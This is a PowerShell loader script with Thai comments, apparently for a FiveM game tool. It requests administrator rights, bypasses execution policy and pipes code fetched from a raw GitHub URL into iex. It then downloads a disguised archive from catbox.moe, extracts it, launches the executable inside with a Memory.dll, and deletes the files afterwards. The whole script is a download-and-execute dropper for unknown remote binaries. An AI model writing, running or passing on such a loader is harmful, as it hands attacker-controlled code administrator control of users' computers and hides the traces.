# 1. ขอสิทธิ์ Administrator อัตโนมัติ
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/nphathrbuychi-boop/Top3/refs/heads/main/CMDFivem').Content)`"" -Verb RunAs
    exit
}

# 2. ตั้งค่าพื้นที่ทำงานและดาวน์โหลดไฟล์
$url = "https://files.catbox.moe/0ukxya.dll"
$workDir = "$env:LOCALAPPDATA\FiveM_Ultra_Tool"
$rarPath = Join-Path $workDir "package.rar"

# ล้างโฟลเดอร์เก่าเพื่อป้องกันไฟล์ซ้ำซ้อน
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

Write-Host "[*] Downloading Package..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $rarPath -UseBasicParsing

# 3. แตกไฟล์ด้วย tar (รองรับ .rar ใน Windows 10/11)
Write-Host "[*] Extracting Files..." -ForegroundColor Cyan
cmd /c "tar -xf `"$rarPath`" -C `"$workDir`""

# 4. ตรวจสอบไฟล์สำคัญ (ป้องกัน Error ใน image_a6f29e.png)
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dll = Join-Path $workDir "Memory.dll"

if (!(Test-Path $dll)) {
    Write-Host "[!] Warning: Memory.dll not found in root. Searching in subfolders..." -ForegroundColor Yellow
    $foundDll = Get-ChildItem -Path $workDir -Filter "Memory.dll" -Recurse | Select-Object -First 1
    if ($foundDll) { Copy-Item $foundDll.FullName -Destination $workDir }
}

# 5. รันโปรแกรม (Force Start)
if ($exe) {
    Write-Host "[+] Found Executable: $($exe.FullName)" -ForegroundColor Green
    Write-Host "[*] Launching System..." -ForegroundColor White
    
    # รันใน Working Directory ที่ถูกต้องเพื่อให้โหลด DLL ติด 100%
    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
} else {
    Write-Host "[!] Error: No executable found in the package." -ForegroundColor Red
    Pause
}

# 6. ล้างไฟล์ชั่วคราวหลังปิดโปรแกรม
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue